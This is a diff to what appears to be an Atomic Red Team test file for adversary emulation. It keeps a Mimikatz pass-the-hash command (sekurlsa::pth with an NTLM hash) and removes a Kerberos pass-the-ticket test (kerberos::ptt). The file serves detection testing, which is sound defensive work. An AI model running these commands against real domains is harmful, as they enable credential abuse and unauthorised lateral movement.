@@ -29,25 +29,3 @@ atomic_tests:
     name: command_prompt
     command: |
       mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
-
-- name: Mimikatz Kerberos Ticket Attack
-  description: |
-    Similar to PTH, but attacking Kerberos
-
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    user_name:
-      description: username
-      type: string
-      default: Administrator
-    domain:
-      description: domain
-      type: string
-      default: atomic.local
-
-  executor:
-    name: command_prompt
-    command: |
-      mimikatz # kerberos::ptt #{user_name}@#{domain}
